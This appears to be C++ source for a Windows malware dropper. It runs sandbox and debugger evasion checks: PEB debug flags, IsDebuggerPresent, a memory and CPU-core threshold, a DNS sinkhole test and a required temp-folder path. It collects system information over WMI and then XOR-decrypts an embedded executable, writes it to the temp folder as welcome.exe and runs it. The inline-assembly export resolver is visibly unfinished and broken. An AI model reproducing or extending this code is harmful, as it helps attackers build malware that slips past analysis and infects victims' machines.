#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <ws2tcpip.h>
#include <time.h>
#include <Windows.h>
#include <comdef.h>
#include <subauth.h>
#include <vector>
#include <Wbemidl.h>
#define _WIN32_DCOM
#pragma comment(lib, "wbemuuid.lib")

typedef struct _PEB_LDR_DATA
{
	ULONG         Length;                            /* Size of structure, used by ntdll.dll as structure version ID */
	BOOLEAN       Initialized;                       /* If set, loader data section for current process is initialized */
	PVOID         SsHandle;
	LIST_ENTRY    InLoadOrderModuleList;             /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in load order */
	LIST_ENTRY    InMemoryOrderModuleList;           /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in memory placement order */
	LIST_ENTRY    InInitializationOrderModuleList;   /* Pointer to LDR_DATA_TABLE_ENTRY structure. Previous and next module in initialization order */
} PEB_LDR_DATA, * PPEB_LDR_DATA; // +0x24

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks; /* 0x00 */
	LIST_ENTRY InMemoryOrderLinks; /* 0x08 */
	LIST_ENTRY InInitializationOrderLinks; /* 0x10 */
	PVOID DllBase; /* 0x18 */
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName; /* 0x24 */
	UNICODE_STRING BaseDllName; /* 0x28 */
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	_ACTIVATION_CONTEXT* EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

unsigned char encrypted_pe[] = {}; // single byte XOR key - 0x55

void* get_ntdll_base_addr()
{
	void *ntdll_base_addr;
	_asm
	{
		mov eax, fs:0x30;			// find PEB
		mov eax, [eax + 0xc];		// PEB_LDR_DATA
		mov eax, [eax + 0xc];		// InLoadOrderModuleList
		mov eax, [eax];				// deref pointer to first module
		mov eax, [eax + 0x18];		// base address of ntdll.dll
		mov ntdll_base_addr, eax;
	}
	return ntdll_base_addr;
}

void *find_export()
{
	void *ntdll_base_addr = get_ntdll_base_addr();
	void* export_table;
	char* function_name;
	void* addr_of_names;
	void* addr_of_functions;
	_asm
	{
		_parse_PE_header:
			mov eax, ntdll_base_addr;
			add eax, [eax + 0x3c];		// pointer to PE header
			mov ebx, [eax];				// get "PE" magic bytes
			cmp ebx, 0x4550;			// check
			jne _oh_shit_exit;			// 

		_check_optional_header:
			mov bx, [eax + 0x18];		// get 0x010b magic bytes
			cmp ebx, 0x10b;				// check 
			jne _oh_shit_exit;

		_get_export_table:
			mov edx, [eax + 0x78];		// export table RVA
			mov eax, ntdll_base_addr;
			add eax, edx;
			mov export_table, eax;
			mov ebx, [eax];
			cmp ebx, 0;
			jne _oh_shit_exit;

		_find_addressoffuncsbase:
			mov edx, [eax + 0x1c];		// RVA AddressOFunctions
			mov addr_of_functions, edx;	// store it
			mov edx, [eax + 0x20];		// RVA AddressOfNames
			mov addr_of_names, edx;		// store it
			mov eax, ntdll_base_addr;	// get image base of dll
			add edx, eax;				// add RVA to image base

		_get_function_name:
			mov edx, [edx];				// RVA address of name
			add edx, eax;				// 
			xor ebx, ebx;				// 
			xor edi, edi;				// will store our hash
			mov esi, edx;				// function name

		_hash_function:
			lodsb;
			test al, al;
			je _compare_hash;
			cmp al, 'L';
			jne _get_next_function;
			inc esi;
			lodsb;
			cmp al, 'd';

		_get_next_function:
			mov edx, addr_of_names;
			mov ecx, ntdll_base_addr;

			add edx, 4;
			jmp _get_function_name


		_compare_hash:
			xor eax, eax;

		_oh_shit_exit:
			xor eax, eax;
	}
	return_asm:

	return ntdll_base_addr;
}

unsigned char get_debug_flag()
{
	unsigned char debugflag;
	__asm
	{
		mov eax, fs:0x30
		add eax, 2
		xor ebx, ebx
		mov bx, [eax]
		mov debugflag, bl
	}
	return debugflag;
}

unsigned char get_ntglobal_flag()
{
	unsigned char ntglobalflag;
	__asm
	{
		mov eax, fs:0x30
		add eax, 0x68
		xor ebx, ebx
		mov ebx, [eax]
		mov ntglobalflag, bl
	}
	return ntglobalflag;
}

BOOL is_being_debugged_api()
{
	if (IsDebuggerPresent() != 0)
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

int has_correct_full_path()
{
	TCHAR lpTempPathBuffer[MAX_PATH];
	std::string commandline = GetCommandLineA();
	// ensure that we get temp path successfully
	if (!GetTempPathA(MAX_PATH, (LPSTR) lpTempPathBuffer))
	{
		return 0;
	}
	std::string temp_path = (LPSTR)lpTempPathBuffer;
	// ensure that we are executing out of temp dir
	if (commandline.find(temp_path) == std::string::npos)
	{
		return 0;
	}
	// return true if filename is as expected
	else if (commandline.find("\\winevtx.exe"))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

int has_sufficient_memory()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);
	DWORDLONG memory_kb = statex.ullTotalPhys/1024;
	// check that system has at least 4gb of memory
	if (memory_kb < 4000000)
	{
		return 0;
	}
	return 1;
}

std::string get_random_string()
{
	char alphabet[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
						  'h', 'i', 'j', 'k', 'l', 'm', 'n',
						  'o', 'p', 'q', 'r', 's', 't', 'u',
						  'v', 'w', 'x', 'y', 'z' };
	std::string res = "";
	srand(time(NULL));
	for (int i = 0; i < rand()% (40 - 20 + 1) + 10; i++)
		res = res + alphabet[rand() % 26];
	return res;
}

int resolve_random_hostname()
{
	DWORD dwRetval;
	struct addrinfo hints;
	struct addrinfo* result = NULL;
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	// initialize the struct
	// GetAddrInfoA may be unstable otherwise
	memset(&hints, 0, sizeof(hints));

	// straight from msdn ;) 
	wVersionRequested = MAKEWORD(2, 2);
	err = WSAStartup(wVersionRequested, &wsaData);
	std::string rand_string = get_random_string();
	rand_string.append(".com");
	// this should return an error code since the domain is some random garbage
	dwRetval = GetAddrInfoA(rand_string.c_str(), NULL, &hints, &result);
	// return 1 if successful dns resolution
	if (dwRetval == 0)
	{
		return 1;
	}
	return 0;
}

int get_number_of_cores()
{
	SYSTEM_INFO sys_info;
	GetSystemInfo(&sys_info);
	return sys_info.dwNumberOfProcessors;
}

HANDLE run_process(std::string commandline)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPSTR lpstr_commandline = const_cast<char*>(commandline.c_str());
	CreateProcessA(NULL, lpstr_commandline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	return pi.hProcess;
}

int payload()
{
	TCHAR lpTempPathBuffer[MAX_PATH];
	DWORD dwBytesWritten = 0;
	// decrypt PE
	for (int i = 0; i < sizeof(encrypted_pe); i++)
	{
		encrypted_pe[i] = encrypted_pe[i] ^ 0x55;
	}
	// find temp dir
	GetTempPathA(MAX_PATH, (LPSTR) lpTempPathBuffer);
	std::string path_to_drop =  (LPSTR) lpTempPathBuffer;
	path_to_drop.append("welcome.exe");
	HANDLE hFile = CreateFileA(path_to_drop.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (WriteFile(hFile, encrypted_pe, sizeof(encrypted_pe), &dwBytesWritten, NULL))
	{
		CloseHandle(hFile);
		run_process(path_to_drop);
	}
	else
	{
		CloseHandle(hFile);
	}
	return 0;
}

std::wstring run_wql(IWbemServices* pSvc, std::string query)
{
	HRESULT hres;

	hres = CoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
	);
	IEnumWbemClassObject* pEnumerator = NULL;

	hres = pSvc->ExecQuery(
		bstr_t("WQL"),
		bstr_t(query.c_str()),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		&pEnumerator);

	IWbemClassObject* pclsObj = NULL;
	ULONG uReturn = 0;
	std::wstring result;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
			&pclsObj, &uReturn);

		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;

		// Get the value of the Name property
		hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
		std::wstring process = vtProp.bstrVal;
		result += process.append(L"*");
		VariantClear(&vtProp);

		pclsObj->Release();
	}
	return result;
}

IWbemServices* create_com_instance()
{
	// copypasta 
	// https://docs.microsoft.com/en-us/windows/win32/wmisdk/example--getting-wmi-data-from-the-local-computer
	HRESULT hres;

	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	hres = CoInitializeSecurity(
		NULL,
		-1,                          // COM authentication
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
	);
	IWbemLocator* pLoc = NULL;
	hres = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID*)&pLoc);
	IWbemServices* pSvc = NULL;
	hres = pLoc->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
		NULL,                    // User name. NULL = current user
		NULL,                    // User password. NULL = current
		0,                       // Locale. NULL indicates current
		NULL,                    // Security flags.
		0,                       // Authority (for example, Kerberos)
		0,                       // Context object 
		&pSvc                    // pointer to IWbemServices proxy
	);
	hres = CoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
	);
	return pSvc;
}

int has_tool_running()
{
	IWbemServices* pSvc = create_com_instance();
	std::wstring process_list = run_wql(pSvc, "SELECT * FROM Win32_Process");
	return 0;
}



int get_system_info()
{
	IWbemServices* pSvc = create_com_instance();
	std::wstring os = run_wql(pSvc, "SELECT * FROM Win32_OperatingSystem");
	std::wstring process_list = run_wql(pSvc, "SELECT * FROM Win32_Process");
	std::wstring virt = run_wql(pSvc, "SELECT * FROM Win32_BIOS");
	std::wstring hostname = run_wql(pSvc, "SELECT * FROM Win32_ComputerSystem");
	return 0;
}

void exit_process()
{
	ExitProcess(0);
}

int analysis_detected()
{
	if (has_correct_full_path() == 0)
	{
		return 1;
	}
	else if (is_being_debugged_api() == 1)
	{
		return 1;
	}
	else if (get_debug_flag() != 0)
	{
		return 1;
	}
	else if (get_ntglobal_flag() == 0x70)
	{
		return 1;
	}
	else if (has_sufficient_memory() == 0)
	{
		return 1;
	}
	else if (resolve_random_hostname() == 1)
	{
		return 1;
	}
	else if (get_number_of_cores() < 4)
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

int main()
{	
	if (analysis_detected() == 1)
	{
		exit_process();
	}
	else
	{
		get_system_info(); // extend this code
		payload();
	}
	return 0;
}
